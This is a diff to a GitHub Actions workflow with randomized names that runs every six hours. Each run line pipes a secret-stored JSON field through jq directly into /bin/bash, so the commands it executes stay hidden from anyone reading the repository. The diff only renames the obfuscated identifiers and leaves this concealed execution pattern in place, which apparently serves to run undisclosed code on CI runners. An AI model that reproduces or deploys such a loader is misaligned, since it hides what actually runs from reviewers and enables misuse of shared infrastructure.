@@ -3,28 +3,25 @@ name: lvmengbu2736
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 3/6 * * *'
+    - cron: '13 1/6 * * *'
 
-jobs:  # 15866
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: lvmengbu2736
         env:
-          q82142: ${{ secrets.q82142 }}
+          isrsn248: ${{ secrets.isrsn248 }}
         run: |
-          echo $q82142 | jq -r .he8715 | /bin/bash
-          echo $bny28735 | jq -r .eghr999 | /bin/bash
-          echo $quui6 | jq -r .zxsf7 | /bin/bash
-          echo $f52748 | jq -r .gv3 | /bin/bash
-          echo $gojvr4 | jq -r .lgheh78 | /bin/bash
-          echo $lxche62 | jq -r .dcidf8869 | /bin/bash
-          echo $oez45 | jq -r .l318 | /bin/bash
-          echo $nvlov92 | jq -r .f598 | /bin/bash
-          echo $beemp5275 | jq -r .q65638 | /bin/bash
-          echo $xbrr9 | jq -r .wj10 | /bin/bash
-          echo $gsb18559 | jq -r .b01807 | /bin/bash
-          echo $yq2788 | jq -r .abq15443 | /bin/bash
-          echo $f576 | jq -r .sv4881 | /bin/bash
+          echo $isrsn248 | jq -r .qpklm4 | /bin/bash
+          echo $ibliq50 | jq -r .mkfce68 | /bin/bash
+          echo $gthc120 | jq -r .pbppv69511 | /bin/bash
+          echo $alq32306 | jq -r .rgiro185 | /bin/bash
+          echo $jqip2108 | jq -r .w1 | /bin/bash
+          echo $t5837 | jq -r .qazyj673 | /bin/bash
+          echo $gyrg3 | jq -r .teqo90046 | /bin/bash
+          echo $zjomg99230 | jq -r .vrusg9 | /bin/bash
+          echo $mvrvj434 | jq -r .w8 | /bin/bash
+          echo $ni72 | jq -r .tx916 | /bin/bash
 
